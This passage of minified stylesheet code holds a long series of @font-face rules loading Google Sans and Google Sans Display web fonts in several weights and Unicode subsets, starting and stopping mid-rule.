Sans';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrwEIJl6pynSEg.woff2)format('woff2');unicode-range:U+0589,U+10A0-10FF,U+1C90-1CBA,U+1CBD-1CBF,U+205A,U+2D00-2D2F,U+2E31;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrwEIJlmpynSEg.woff2)format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrwEIJl-pynSEg.woff2)format('woff2');unicode-range:U+0951-0952,U+0964-0965,U+0A80-0AFF,U+200C-200D,U+20B9,U+25CC,U+A830-A839;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrwEIJlGpynSEg.woff2)format('woff2');unicode-range:U+0951-0952,U+0964-0965,U+0A01-0A76,U+200C-200D,U+20B9,U+25CC,U+262C,U+A830-A839;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrwEIJlnpynSEg.woff2)format('woff2');unicode-range:U+0307-0308,U+0590-05FF,U+200C-2010,U+20AA,U+25CC,U+FB1D-FB4F;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrwEIJlupynSEg.woff2)format('woff2');unicode-range:U+1780-17FF,U+19E0-19FF,U+200C-200D,U+25CC;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrwEIJlspynSEg.woff2)format('woff2');unicode-range:U+0E81-0EDF,U+200C-200D,U+25CC;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrwEIJl8pynSEg.woff2)format('woff2');unicode-range:U+0951-0952,U+0964-0965,U+0B01-0B77,U+1CDA,U+1CF2,U+200C-200D,U+20B9,U+25CC;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrwEIJl4pynSEg.woff2)format('woff2');unicode-range:U+0964-0965,U+0D81-0DF4,U+1CF2,U+200C-200D,U+25CC,U+111E1-111F4;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrwEIJlzpynSEg.woff2)format('woff2');unicode-range:U+0964-0965,U+0B82-0BFA,U+200C-200D,U+20B9,U+25CC;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrwEIJl5pynSEg.woff2)format('woff2');unicode-range:U+0951-0952,U+0964-0965,U+0C00-0C7F,U+1CDA,U+1CF2,U+200C-200D,U+25CC;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrwEIJlxpynSEg.woff2)format('woff2');unicode-range:U+02D7,U+0303,U+0331,U+0E01-0E5B,U+200C-200D,U+25CC;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrwEIJlqpynSEg.woff2)format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrwEIJlrpynSEg.woff2)format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrwEIJllpyk.woff2)format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:500;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrw2IJl1pynSEg.woff2)format('woff2');unicode-range:U+0308,U+0530-058F,U+2010,U+2024,U+25CC,U+FB13-FB17;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:500;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrw2IJl3pynSEg.woff2)format('woff2');unicode-range:U+0951-0952,U+0964-0965,U+0980-09FE,U+1CD0,U+1CD2,U+1CD5-1CD6,U+1CD8,U+1CE1,U+1CEA,U+1CED,U+1CF2,U+1CF5-1CF7,U+200C-200D,U+20B9,U+25CC,U+A8F1;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:500;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrw2IJlopynSEg.woff2)format('woff2');unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:500;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrw2IJlhpynSEg.woff2)format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:500;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrw2IJlkpynSEg.woff2)format('woff2');unicode-range:U+0900-097F,U+1CD0-1CF9,U+200C-200D,U+20A8,U+20B9,U+20F0,U+25CC,U+A830-A839,U+A8E0-A8FF,U+11B00-11B09;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:500;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrw2IJl0pynSEg.woff2)format('woff2');unicode-range:U+030E,U+1200-1399,U+2D80-2DDE,U+AB01-AB2E,U+1E7E0-1E7E6,U+1E7E8-1E7EB,U+1E7ED-1E7EE,U+1E7F0-1E7FE;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:500;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrw2IJl6pynSEg.woff2)format('woff2');unicode-range:U+0589,U+10A0-10FF,U+1C90-1CBA,U+1CBD-1CBF,U+205A,U+2D00-2D2F,U+2E31;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:500;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrw2IJlmpynSEg.woff2)format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:500;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrw2IJl-pynSEg.woff2)format('woff2');unicode-range:U+0951-0952,U+0964-0965,U+0A80-0AFF,U+200C-200D,U+20B9,U+25CC,U+A830-A839;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:500;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrw2IJlGpynSEg.woff2)format('woff2');unicode-range:U+0951-0952,U+0964-0965,U+0A01-0A76,U+200C-200D,U+20B9,U+25CC,U+262C,U+A830-A839;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:500;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrw2IJlnpynSEg.woff2)format('woff2');unicode-range:U+0307-0308,U+0590-05FF,U+200C-2010,U+20AA,U+25CC,U+FB1D-FB4F;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:500;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrw2IJlupynSEg.woff2)format('woff2');unicode-range:U+1780-17FF,U+19E0-19FF,U+200C-200D,U+25CC;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:500;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrw2IJlspynSEg.woff2)format('woff2');unicode-range:U+0E81-0EDF,U+200C-200D,U+25CC;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:500;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrw2IJl8pynSEg.woff2)format('woff2');unicode-range:U+0951-0952,U+0964-0965,U+0B01-0B77,U+1CDA,U+1CF2,U+200C-200D,U+20B9,U+25CC;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:500;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrw2IJl4pynSEg.woff2)format('woff2');unicode-range:U+0964-0965,U+0D81-0DF4,U+1CF2,U+200C-200D,U+25CC,U+111E1-111F4;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:500;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrw2IJlzpynSEg.woff2)format('woff2');unicode-range:U+0964-0965,U+0B82-0BFA,U+200C-200D,U+20B9,U+25CC;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:500;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrw2IJl5pynSEg.woff2)format('woff2');unicode-range:U+0951-0952,U+0964-0965,U+0C00-0C7F,U+1CDA,U+1CF2,U+200C-200D,U+25CC;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:500;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrw2IJlxpynSEg.woff2)format('woff2');unicode-range:U+02D7,U+0303,U+0331,U+0E01-0E5B,U+200C-200D,U+25CC;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:500;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrw2IJlqpynSEg.woff2)format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:500;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrw2IJlrpynSEg.woff2)format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:500;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrw2IJllpyk.woff2)format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:700;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrzjJ5l1pynSEg.woff2)format('woff2');unicode-range:U+0308,U+0530-058F,U+2010,U+2024,U+25CC,U+FB13-FB17;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:700;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrzjJ5l3pynSEg.woff2)format('woff2');unicode-range:U+0951-0952,U+0964-0965,U+0980-09FE,U+1CD0,U+1CD2,U+1CD5-1CD6,U+1CD8,U+1CE1,U+1CEA,U+1CED,U+1CF2,U+1CF5-1CF7,U+200C-200D,U+20B9,U+25CC,U+A8F1;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:700;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrzjJ5lopynSEg.woff2)format('woff2');unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:700;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrzjJ5lhpynSEg.woff2)format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:700;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrzjJ5lkpynSEg.woff2)format('woff2');unicode-range:U+0900-097F,U+1CD0-1CF9,U+200C-200D,U+20A8,U+20B9,U+20F0,U+25CC,U+A830-A839,U+A8E0-A8FF,U+11B00-11B09;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:700;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrzjJ5l0pynSEg.woff2)format('woff2');unicode-range:U+030E,U+1200-1399,U+2D80-2DDE,U+AB01-AB2E,U+1E7E0-1E7E6,U+1E7E8-1E7EB,U+1E7ED-1E7EE,U+1E7F0-1E7FE;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:700;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrzjJ5l6pynSEg.woff2)format('woff2');unicode-range:U+0589,U+10A0-10FF,U+1C90-1CBA,U+1CBD-1CBF,U+205A,U+2D00-2D2F,U+2E31;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:700;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrzjJ5lmpynSEg.woff2)format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:700;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrzjJ5l-pynSEg.woff2)format('woff2');unicode-range:U+0951-0952,U+0964-0965,U+0A80-0AFF,U+200C-200D,U+20B9,U+25CC,U+A830-A839;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:700;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrzjJ5lGpynSEg.woff2)format('woff2');unicode-range:U+0951-0952,U+0964-0965,U+0A01-0A76,U+200C-200D,U+20B9,U+25CC,U+262C,U+A830-A839;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:700;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrzjJ5lnpynSEg.woff2)format('woff2');unicode-range:U+0307-0308,U+0590-05FF,U+200C-2010,U+20AA,U+25CC,U+FB1D-FB4F;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:700;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrzjJ5lupynSEg.woff2)format('woff2');unicode-range:U+1780-17FF,U+19E0-19FF,U+200C-200D,U+25CC;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:700;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrzjJ5lspynSEg.woff2)format('woff2');unicode-range:U+0E81-0EDF,U+200C-200D,U+25CC;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:700;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrzjJ5l8pynSEg.woff2)format('woff2');unicode-range:U+0951-0952,U+0964-0965,U+0B01-0B77,U+1CDA,U+1CF2,U+200C-200D,U+20B9,U+25CC;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:700;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrzjJ5l4pynSEg.woff2)format('woff2');unicode-range:U+0964-0965,U+0D81-0DF4,U+1CF2,U+200C-200D,U+25CC,U+111E1-111F4;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:700;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrzjJ5lzpynSEg.woff2)format('woff2');unicode-range:U+0964-0965,U+0B82-0BFA,U+200C-200D,U+20B9,U+25CC;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:700;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrzjJ5l5pynSEg.woff2)format('woff2');unicode-range:U+0951-0952,U+0964-0965,U+0C00-0C7F,U+1CDA,U+1CF2,U+200C-200D,U+25CC;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:700;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrzjJ5lxpynSEg.woff2)format('woff2');unicode-range:U+02D7,U+0303,U+0331,U+0E01-0E5B,U+200C-200D,U+25CC;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:700;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrzjJ5lqpynSEg.woff2)format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:700;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrzjJ5lrpynSEg.woff2)format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:700;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrzjJ5llpyk.woff2)format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}@font-face{font-family:'Google Sans Display';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/googlesansdisplay/v13/ea8FacM9Wef3EJPWRrHjgE4B6CnlZxHVDvr9oS_a.woff2)format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;}@font-face{font-family:'Google Sans Display';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/googlesansdisplay/v13/ea8FacM9Wef3EJPWRrHjgE4B6CnlZxHVDv39oS_a.woff2)format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF;}@font-face{font-family:'Google Sans Display';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/googlesansdisplay/v13/ea8FacM9Wef3EJPWRrHjgE4B6CnlZxHVDvH9oS_a.woff2)format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;}@font-face{font-family:'Google Sans Display';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/googlesansdisplay/v13/ea8FacM9Wef3EJPWRrHjgE4B6CnlZxHVDvD9oS_a.woff2)format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;}@font-face{font-family:'Google Sans Display';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/googlesansdisplay/v13/ea8FacM9Wef3EJPWRrHjgE4B6CnlZxHVDv79oQ.woff2)format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}@font-face{font-family:'Google Sans Display';font-style:normal;font-weight:500;src:url(//fonts.gstatic.com/s/googlesansdisplay/v13/ea8IacM9Wef3EJPWRrHjgE4B6CnlZxHVBg3etBT7TKx9.woff2)format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;}@font-face{font-family:'Google Sans Display';font-style:normal;font-weight:500;src:url(//fonts.gstatic.com/s/googlesansdisplay/v13/ea8IacM9Wef3EJPWRrHjgE4B6CnlZxHVBg3etBP7TKx9.woff2)format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF;}@font-face{font-family:'Google Sans Display';font-style:normal;font-weight:500;src:url(//fonts.gstatic.com/s/googlesansdisplay/v13/ea8IacM9Wef3EJPWRrHjgE4B6CnlZxHVBg3etB_7TKx9.woff2)format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;}@font-face{font-family:'Google Sans Display';font-style:normal;font-weight:500;src:url(//fonts.gstatic.com/s/googlesansdisplay/v13/ea8IacM9Wef3EJPWRrHjgE4B6CnlZxHVBg3etB77TKx9.woff2)format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;}@font-face{font-family:'Google Sans Display';font-style:normal;font-weight:500;src:url(//fonts.gstatic.com/s/googlesansdisplay/v13/ea8IacM9Wef3EJPWRrHjgE4B6CnlZxHVBg3etBD7TA.woff2)format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}@font-face{font-family:'Google Sans Display';font-style:normal;font-weight:700;src:url(//fonts.gstatic.com/s/googlesansdisplay/v13/ea8IacM9Wef3EJPWRrHjgE4B6CnlZxHVBkXYtBT7TKx9.woff2)format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;}@font-face{font-family:'Google Sans Display';font-style:normal;font-weight:700;src:url(//fonts.gstatic.com/s/googlesansdisplay/v13/ea8IacM9Wef3EJPWRrHjgE4B6CnlZxHVBkXYtBP7TKx9.woff2)format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF;}@font-face{font-family:'Google Sans 